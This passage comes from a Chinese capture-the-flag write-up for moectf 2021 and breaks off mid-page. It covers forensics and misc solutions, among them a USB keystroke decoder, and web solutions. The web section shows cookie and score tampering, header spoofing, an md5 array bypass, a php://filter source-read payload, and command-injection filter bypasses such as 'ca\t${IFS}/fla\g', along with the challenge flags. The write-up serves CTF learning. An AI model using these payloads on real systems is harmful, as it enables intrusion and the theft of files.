href="https://noahbox.github.io/guestbook/">留言版 | Noah’s TRPG Box (noahbox.github.io)</a> 留言簿中发现这个<img src="https://i.loli.net/2021/09/24/Ckd7RgP9852LpbQ.png" alt="" style="zoom:50%;" /></p><p>在侧边栏找到github地址，进入发现被hacked的仓库有摩斯密码，解密即可</p><p><code>moectf&#123;HAHAHAHAH_NOAH_IS_A_VEGETABLE_CHICKEN&#125;</code></p><h2 id="好-康-的"><a href="#好-康-的" class="headerlink" title="好 康 的"></a><strong>好 康 的</strong></h2><blockquote><p>参考博客<a href="https://blog.csdn.net/weixin_50656679/article/details/108936650?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163249925516780262529870%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163249925516780262529870&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-24-108936650.pc_v2_rank_blog_default&utm_term=mkv&spm=1018.2226.3001.4450">https://blog.csdn.net/weixin_50656679/article/details/108936650?ops_request_misc=%7B%22request%5Fid%22%3A%22163249925516780262529870%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&amp;request_id=163249925516780262529870&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<del>blog</del>first_rank_v2~rank_v29-24-108936650.pc_v2_rank_blog_default&amp;utm_term=mkv&amp;spm=1018.2226.300</a></p></blockquote><ol><li>播放发现在3分钟左右之后就不能播放，感觉有问题，用 <code>mkvtoolnix</code> 分离出来字幕和视频，拖进<code>010 Editor</code> 直接搜索 <code>moectf</code> ，找到flag</li><li>用potplayer打开视频，然后将字幕另存为1.ass，打开后发现最后一行为flag</li></ol><p><img src="https://i.loli.net/2021/09/25/gB9Y4Z8IwPEqed7.png"></p><p><code>moectf&#123;N3v3r_90tt@_L3t-y0U_dOwN~&#125;</code></p><h2 id="easyForensics"><a href="#easyForensics" class="headerlink" title="easyForensics"></a><strong>easyForensics</strong></h2><p>用 <code>AccessData FTK Imager</code> 打开，游览找到 <code>flag.mp4</code> ，非常惊喜，用各种办法尝试分析没得出任何信息(虽然发现有一些很奇怪的文件)</p><p>等到比赛结束的时候才知道不是这个文件(<del>Noah设陷阱哈</del>，比赛结束后在 <code>FTK</code> 里发现一些被删除的文件夹(Base64命名)还有一个python文件，全部导出来，然后用bat导出文件名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DIR *. * /B&gt; LIST.TXT</span><br></pre></td></tr></table></figure><p>看到python文件中有 <code>data = data.replace(&quot;/&quot;, &quot;_&quot;)</code> 我们再将<code>_</code>全部换成<code>/</code></p><p>再用base64解码(我用<code>CyberChef</code>)查看16进制结果，发现是个word,网上找脚本输出word得出flag</p><p><code>moectf&#123;Th@1s_N0t_U53FULL@_4LL&#125;</code></p><h2 id="R-P-G"><a href="#R-P-G" class="headerlink" title="R P G"></a><strong>R P G</strong></h2><p><del>这个我以为要修改数据通关数据，确实也是如此因为实在过不了关</del></p><p>Noah师傅传授的一种就是交换<code>Data</code>  里的<code>Map001.json</code> <code>和Map002.json</code> 的文件名称，便可通过第一关拿到第一个字母，*<del>往复循环</del>*你就可以得到base64编码的一串字符串（<del>秃了也变强了</del>）</p><p>其实打开map002.json，仔细查看便可以看到一列有规律的base64字符串，提取出来，反复解码，便得到</p><p><code>moectf&#123;Th3_w0rld_0f_G4m3&#125;</code></p><h2 id="诺亚的日记"><a href="#诺亚的日记" class="headerlink" title="诺亚的日记"></a><strong>诺亚的日记</strong></h2><blockquote><p>参考博客<a href="https://blog.csdn.net/qq_43625917/article/details/107723635?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163250153316780269830444%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163250153316780269830444&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-107723635.pc_search_result_hbase_insert&utm_term=tshark+usb&spm=1018.2226.3001.4187">https://blog.csdn.net/qq_43625917/article/details/107723635?ops_request_misc=%7B%22request%5Fid%22%3A%22163250153316780269830444%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=163250153316780269830444&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2<del>all</del>first_rank_ecpm_v1~rank_v31_ecpm-2-107723635.pc_search_result_hbase_insert&amp;utm_term=tshark+usb&amp;spm=1018.2226.3001.4187</a></p></blockquote><p>用<code>101editor</code>打开，发现了<code>wireshark</code>字样，正好之前用过，结果数据里面没有<code>Leftover Capture Data</code> ，就百度到上面的博客，在kali中执行以下命令，结果空白格，放到ubuntu里面分析，可以了(实际<em>kali的tshark的版本问题</em>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br><span class="line">tshark -r usb.pcap -T fields -e usb.capdata | sed <span class="string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt <span class="comment">#提取并去除空行</span></span><br></pre></td></tr></table></figure><p>便提取到了usb的流量数据，然后用映射关系，将所做操作提取出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;</span><br><span class="line">    <span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line">    <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line">     <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line">      <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line">       <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line">        <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line">         <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,</span><br><span class="line">         <span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,</span><br><span class="line">         <span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line">         <span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,</span><br><span class="line">         <span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line">    <span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line">     <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line">      <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>,</span><br><span class="line">       <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line">        <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line">         <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>,</span><br><span class="line">          <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line">          <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = open(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">if</span> line[0]!=<span class="string">&#x27;0&#x27;</span> or (line[1]!=<span class="string">&#x27;0&#x27;</span> and line[1]!=<span class="string">&#x27;2&#x27;</span>) or line[3]!=<span class="string">&#x27;0&#x27;</span> or line[4]!=<span class="string">&#x27;0&#x27;</span> or line[9]!=<span class="string">&#x27;0&#x27;</span> or line[10]!=<span class="string">&#x27;0&#x27;</span> or line[12]!=<span class="string">&#x27;0&#x27;</span> or line[13]!=<span class="string">&#x27;0&#x27;</span> or line[15]!=<span class="string">&#x27;0&#x27;</span> or line[16]!=<span class="string">&#x27;0&#x27;</span> or line[18]!=<span class="string">&#x27;0&#x27;</span> or line[19]!=<span class="string">&#x27;0&#x27;</span> or line[21]!=<span class="string">&#x27;0&#x27;</span> or line[22]!=<span class="string">&#x27;0&#x27;</span> or line[6:8]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">             <span class="built_in">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[6:8] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    try:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        del output[a]</span><br><span class="line">        del output[a-1]</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(output)):</span><br><span class="line">    try:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=1</span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==2:</span><br><span class="line">                flag=0</span><br><span class="line">        <span class="keyword">if</span> flag!=0:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="comment">##结果2021nian&lt;SPACE&gt;8yue&lt;SPACE&gt;5ri&lt;SPACE&gt;,qing22&lt;DEL&gt;&lt;RET&gt;zuotian&lt;SPACE&gt;gei&lt;SPACE&gt;hanshu&lt;SPACE&gt;fale&lt;SPACE&gt;caotu&lt;SPACE&gt;,cadai&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;odaooo&lt;DEL&gt;&lt;DEL&gt;41tale&lt;SPACE&gt;,kaixin&lt;SPACE&gt;&lt;RET&gt;yizhou&lt;SPACE&gt;meiyoukan&lt;SPACE&gt;jiaran=61de&lt;SPACE&gt;shipinle&lt;SPACE&gt;,nanshou&lt;SPACE&gt;nie1&lt;RET&gt;dongfangyaohe&lt;SPACE&gt;musedash&lt;RET&gt;liandongle&lt;SPACE&gt;,shuangchukuangxi&lt;SPACE&gt;[unknown][unknown]&lt;DEL&gt;chu=2[unknown][unknown]&lt;RET&gt;moectf&lt;RET&gt;de&lt;SPACE&gt;misc&lt;RET&gt;ti&lt;SPACE&gt;caichule&lt;SPACE&gt;4dao2,male&lt;SPACE&gt;&lt;RET&gt;woxiang&lt;SPACE&gt;moyu2moyu&lt;SPACE&gt;mou&lt;DEL&gt;yu&lt;SPACE&gt;&lt;RET&gt;d&lt;DEL&gt;&lt;GA&gt;damedane&lt;RET&gt;\&lt;DEL&gt;,&lt;RET&gt;dameyo&lt;SPACE&gt;&lt;RET&gt;,&lt;RET&gt;damenanoyo&lt;SPACE&gt;&lt;RET&gt;&lt;RET&gt;xin2misc&lt;RET&gt;ti&lt;SPACE&gt;de&lt;SPACE&gt;flag&lt;RET&gt;xiangge3shengcao21yidiande&lt;SPACE&gt;&lt;RET&gt;jiujiao&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;yo&lt;DEL&gt;ng&lt;SPACE&gt;&lt;SPACE&gt;*moectf&lt;RET&gt;&#123;&#125;[unknown]D@m3daNe_D4me_yoooooo*[unknown][unknown][unknown]haole&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;SPACE&gt;haole&lt;SPACE&gt;riji&lt;SPACE&gt;.&lt;DEL&gt;.txt&lt;RET&gt;</span></span><br></pre></td></tr></table></figure><p><code>moectf&#123;D@m3daNe_D4me_yoooooo&#125;</code></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a><strong>GET</strong></h2><p>用GET获取<br><code>http://47.93.215.154:10000/?moe=flag</code></p><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a><strong>POST</strong></h2><p><code>Hackerbar</code> 发个POST</p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a><strong>Cookie</strong></h2><p>页面显示flag只给cookie，于是查看cookie，发现其值为0.说明我不是VIP！<br>于是修改其值为1 于是flag就交给我了。<br><code>moectf&#123;C00kie_1s_sw33t!&#125;</code></p><h2 id="2048"><a href="#2048" class="headerlink" title="2048"></a><strong>2048</strong></h2><p>web题下js类的题目，在游戏开始和结束时都会发送请求。开bp！ </p><p><img src="https://i.loli.net/2021/09/21/gbu8cPvH3lyhSRZ.png"> </p><p>传参指定参数即可</p><p><img src="https://i.loli.net/2021/09/21/1sKfCVTO9hNyS67.png"></p><p>开游戏，抓包，乱玩，死了，找到包发到repeater，分数一改，发过去，flag就有啦。  </p><p><code>moectf&#123;2048_1s_intere5t1ng!&#125;</code></p><h2 id="Web-Inc"><a href="#Web-Inc" class="headerlink" title="Web_Inc"></a><strong>Web_Inc</strong></h2><p>百度搜索:md5绕过  </p><p><img src="https://i.loli.net/2021/09/21/DCytjM7OwfbKoAq.png"></p><p>题目要求是a,b不相等，但它们的md5值严格相等，<font color='red'>注意是===而不是==</font></p><p>可以构造数组绕过，<code>a[]=1 b[]=2</code>,传参得到flag</p><p><img src="https://i.loli.net/2021/09/21/blLWIVTosDG2YmF.png"></p><p>已知数组是不可哈希类型，而md5是基于哈希算法。所以ab赋为不同值数组，md5之后都是NULL但值不同所以就过了。flag get！<br><code>moectf&#123;xdsec3gf9dfg62fh342&#125;</code></p><h2 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a><strong>ez_include</strong></h2><p>此题用php://input传参发现没有反应，估计是input被屏蔽了，尝试使用<font color='red'>filter</font>协议读取flag.php的源码，并用base64解密</p><p><img src="https://i.loli.net/2021/09/21/HF2gSVjakIBxo73.png"></p><p><code>php://filter/read=convert.base64-encode/resource=flag.php``moectf&#123;xdsec6asdgas7ahfsfaxczc&#125;</code></p><p>解密得到：<?$flag="moectf{xdsec6asdgas7ahfsfaxczc}";?></p><h2 id="Do-your-know-http"><a href="#Do-your-know-http" class="headerlink" title="Do your know http?"></a><strong>Do your know http?</strong></h2><p>这题考察的应该是对HTTP头的理解，采用Burpsuite抓包修改进行解题</p><p>共有四关，1.用’HS’来请求试试？改成<code>HS</code></p><img src="https://i.loli.net/2021/09/21/lf4NeDthuJAEbpx.png" alt=""  /><p>2.用本地ip访问<br><code>X-forwarded-for:127.0.0.1</code></p><p><img src="https://i.loli.net/2021/09/21/bVkfSq4zwtA27XE.png"></p><p>3.网页来源</p><p><code>referer:www.ltyyds.com</code></p><p><img src="https://i.loli.net/2021/09/21/HduOYyIQwqanFzU.png"></p><p>4.伪造浏览器</p><p><code>User-Agent: LT</code></p><p><img src="https://i.loli.net/2021/09/21/Fr5QYVbjnRwShzq.png"></p><p><code>moectf&#123;HTTPHeaders_1s_s0_ea5y!&#125;</code></p><h2 id="babeRCE"><a href="#babeRCE" class="headerlink" title="babeRCE"></a><strong>babeRCE</strong></h2><blockquote><p>参考博客<a href="https://www.cnblogs.com/0yst3r-2046/p/12600073.html">https://www.cnblogs.com/0yst3r-2046/p/12600073.html</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">system(<span class="variable">$rce</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hhhhhhacker!!!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">highlight_file(**FILE**);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审查代码看到<em>cat more less nl tac等</em> 都被过滤了，ls没被过滤，用<code>burpsuite</code> 进行监控，重发</p><p><code>?rce=ls</code></p><p><code>find$&#123;IFS&#125;/$&#123;IFS&#125;-name$&#123;IFS&#125;fla\g</code>  </p><p>发现了/flag以及index.php，<del>绝笔藏在flag，但不能直接看，那就绕过</del></p><p><code>?rce=ca\t$&#123;IFS&#125;/fla\g</code> ,得到flag</p><p><code>moectf&#123;Do_y0u_l1k3_Rcccccccccccccce?&#125;</code></p><h2 id="ezunserialize"><a href="#ezunserialize" class="headerlink" title="ezunserialize"></a><strong>ezunserialize</strong></h2><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 